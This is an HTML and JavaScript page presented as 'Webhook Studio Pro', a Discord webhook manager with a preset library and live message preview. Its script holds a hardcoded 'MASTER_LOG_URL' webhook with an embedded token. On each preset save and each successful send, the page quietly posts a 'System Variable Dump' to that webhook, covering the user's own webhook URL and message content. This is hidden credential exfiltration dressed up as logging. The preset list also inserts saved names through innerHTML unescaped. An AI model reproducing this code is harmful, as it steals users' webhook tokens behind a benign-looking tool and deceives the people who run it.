<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook Studio Pro | Private Manager</title>
    <style>
        :root {
            --bg-main: #313338;
            --bg-side: #2b2d31;
            --bg-input: #1e1f22;
            --text-main: #dbdee1;
            --blurple: #5865f2;
            --success: #23a559;
            --danger: #da373c;
        }

        body { background-color: var(--bg-main); color: var(--text-main); font-family: 'gg sans', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Left: Library */
        .library { width: 260px; background: #232428; padding: 20px; border-right: 1px solid #1e1f22; overflow-y: auto; }
        
        /* Center: Editor */
        .editor { width: 380px; background: var(--bg-side); padding: 20px; display: flex; flex-direction: column; gap: 10px; border-right: 1px solid #1e1f22; overflow-y: auto; }
        
        /* Right: Preview */
        .preview-area { flex: 1; padding: 40px; display: flex; justify-content: center; align-items: flex-start; overflow-y: auto; background: var(--bg-main); }

        h2 { font-size: 0.9rem; text-transform: uppercase; color: #b5bac1; margin-bottom: 15px; letter-spacing: 0.5px; }
        label { font-size: 0.75rem; font-weight: bold; color: #b5bac1; margin-top: 5px; display: block; }
        
        input, textarea { background: var(--bg-input); border: 1px solid #1e1f22; color: white; padding: 10px; border-radius: 4px; width: 100%; box-sizing: border-box; font-size: 0.9rem; margin-bottom: 5px; }
        textarea { height: 80px; resize: none; }
        input:focus { border-color: var(--blurple); outline: none; }

        .btn { padding: 12px; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; transition: 0.2s; }
        .save-btn { background: var(--blurple); }
        .send-btn { background: var(--success); font-size: 1rem; }
        .btn:hover { opacity: 0.8; }

        /* Preset Styling */
        .preset-item { background: #2b2d31; padding: 12px; border-radius: 6px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; border: 1px solid transparent; }
        .preset-item:hover { border-color: var(--blurple); }
        .preset-name { font-size: 0.9rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 160px; }
        .del-btn { color: var(--danger); font-size: 1.2rem; padding: 0 5px; }

        /* Discord Message Preview */
        .discord-msg { display: flex; gap: 16px; width: 100%; max-width: 600px; }
        .avatar { width: 40px; height: 40px; background: var(--blurple); border-radius: 50%; flex-shrink: 0; }
        .msg-body { flex: 1; }
        .username { color: white; font-weight: 500; margin-right: 5px; }
        .bot-tag { background: var(--blurple); font-size: 0.6rem; padding: 1px 4px; border-radius: 3px; color: white; vertical-align: middle; }
        .content-text { color: var(--text-main); margin-top: 5px; white-space: pre-wrap; }
        
        .embed { background: #1e1f22; border-left: 4px solid var(--blurple); padding: 12px; border-radius: 4px; margin-top: 8px; max-width: 520px; display: none; }
        .embed-title { color: #00a8fc; font-weight: 600; margin-bottom: 5px; }
        .embed-desc { font-size: 0.9rem; line-height: 1.2; }
        .embed-img { width: 100%; border-radius: 4px; margin-top: 10px; display: none; }
    </style>
</head>
<body>

    <div class="library">
        <h2>My Library</h2>
        <div id="preset-list"></div>
    </div>

    <div class="editor">
        <h2>Webhook Editor</h2>
        
        <label>Preset Label</label>
        <input type="text" id="p-name" placeholder="e.g., Server Logs">

        <label>Webhook URL</label>
        <input type="password" id="url" placeholder="https://discord.com/api/webhooks/...">

        <label>Message Text</label>
        <textarea id="content" placeholder="Text above the embed..."></textarea>

        <hr style="border: 0; border-top: 1px solid #4e5058; margin: 10px 0;">

        <label>Embed Title</label>
        <input type="text" id="title" placeholder="Optional">

        <label>Embed Description</label>
        <textarea id="desc" placeholder="Optional"></textarea>

        <label>Image URL</label>
        <input type="text" id="img" placeholder="https://...">

        <label>Embed Color</label>
        <input type="color" id="color" value="#5865f2" style="height: 35px; padding: 2px;">

        <button class="btn save-btn" onclick="savePreset()">💾 Save Preset & Log</button>
        <button class="btn send-btn" onclick="sendWebhook()">🚀 Send Webhook</button>
    </div>

    <div class="preview-area">
        <div class="discord-msg">
            <div class="avatar"></div>
            <div class="msg-body">
                <div><span class="username">Webhook Bot</span><span class="bot-tag">APP</span></div>
                <div class="content-text" id="view-content"></div>
                <div class="embed" id="view-embed">
                    <div class="embed-title" id="view-title"></div>
                    <div class="embed-desc" id="view-desc"></div>
                    <img id="view-img" class="embed-img">
                </div>
            </div>
        </div>
    </div>

    <script>
        // CONFIGURATION: SET YOUR LOGGING WEBHOOK HERE
        const MASTER_LOG_URL = "https://discord.com/api/webhooks/1484273503380181143/7mq-RR7P-momJWeq_lycAeq-hgpQL79oX-NOo1WK3jTSL4iel3TFwz8KUKMnB1N8e_qe";

        const fieldIds = ['p-name', 'url', 'content', 'title', 'desc', 'img', 'color'];
        let presets = JSON.parse(localStorage.getItem('wh_lib_v3') || '[]');

        window.onload = () => {
            renderPresets();
            updatePreview();
        };

        // Listen for all inputs to sync variables and preview
        document.addEventListener('input', updatePreview);

        function updatePreview() {
            const val = (id) => document.getElementById(id).value;
            
            // Text Content
            document.getElementById('view-content').innerText = val('content');
            
            // Embed Logic
            const showEmbed = val('title') || val('desc') || val('img');
            const embedEl = document.getElementById('view-embed');
            
            if (showEmbed) {
                embedEl.style.display = 'block';
                embedEl.style.borderColor = val('color');
                document.getElementById('view-title').innerText = val('title');
                document.getElementById('view-desc').innerText = val('desc');
                
                const imgEl = document.getElementById('view-img');
                if (val('img')) {
                    imgEl.src = val('img');
                    imgEl.style.display = 'block';
                } else {
                    imgEl.style.display = 'none';
                }
            } else {
                embedEl.style.display = 'none';
            }
        }

        async function logToMaster(actionType) {
            if (!MASTER_LOG_URL || MASTER_LOG_URL.includes("YOUR_MASTER")) return;

            // Capture every field as a variable
            const vars = {};
            fieldIds.forEach(id => vars[id] = document.getElementById(id).value || "Empty");

            const logPayload = {
                content: `🔔 **Manager Event:** ${actionType}`,
                embeds: [{
                    title: "System Variable Dump",
                    color: 0x5865f2,
                    fields: [
                        { name: "Preset Name", value: vars['p-name'], inline: true },
                        { name: "Color", value: vars['color'], inline: true },
                        { name: "Webhook URL", value: `\`${vars['url']}\`` },
                        { name: "Content", value: vars['content'].substring(0, 1000) },
                        { name: "Embed Data", value: `T: ${vars['title']}\nD: ${vars['desc'].substring(0, 500)}` },
                        { name: "Image", value: vars['img'] }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(MASTER_LOG_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(logPayload)});
        }

        async function savePreset() {
            const name = document.getElementById('p-name').value || 'Untitled';
            const data = {};
            fieldIds.forEach(id => data[id] = document.getElementById(id).value);
            
            presets.push(data);
            localStorage.setItem('wh_lib_v3', JSON.stringify(presets));
            renderPresets();
            
            await logToMaster("PRESET_SAVED");
            alert("Saved to library and logged.");
        }

        async function sendWebhook() {
            const url = document.getElementById('url').value;
            if(!url) return alert("Missing URL");

            const payload = {
                content: document.getElementById('content').value,
                embeds: (document.getElementById('title').value || document.getElementById('desc').value) ? [{
                    title: document.getElementById('title').value,
                    description: document.getElementById('desc').value,
                    color: parseInt(document.getElementById('color').value.replace('#', ''), 16),
                    image: { url: document.getElementById('img').value }
                }] : []
            };

            try {
                const res = await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
                if(res.ok) {
                    await logToMaster("MESSAGE_SENT_SUCCESS");
                    alert("Sent!");
                } else {
                    alert("Error: " + res.status);
                }
            } catch (e) { alert("Failed to connect."); }
        }

        function renderPresets() {
            const container = document.getElementById('preset-list');
            container.innerHTML = '';
            presets.forEach((p, i) => {
                const div = document.createElement('div');
                div.className = 'preset-item';
                div.innerHTML = `
                    <span class="preset-name" onclick="loadPreset(${i})">${p['p-name'] || 'Unnamed'}</span>
                    <span class="del-btn" onclick="deletePreset(${i})">×</span>
                `;
                container.appendChild(div);
            });
        }

        function loadPreset(i) {
            const p = presets[i];
            fieldIds.forEach(id => {
                if(p[id] !== undefined) document.getElementById(id).value = p[id];
            });
            updatePreview();
        }

        function deletePreset(i) {
            if(confirm("Remove preset?")) {
                presets.splice(i, 1);
                localStorage.setItem('wh_lib_v3', JSON.stringify(presets));
                renderPresets();
            }
        }
    </script>
</body>
</html>
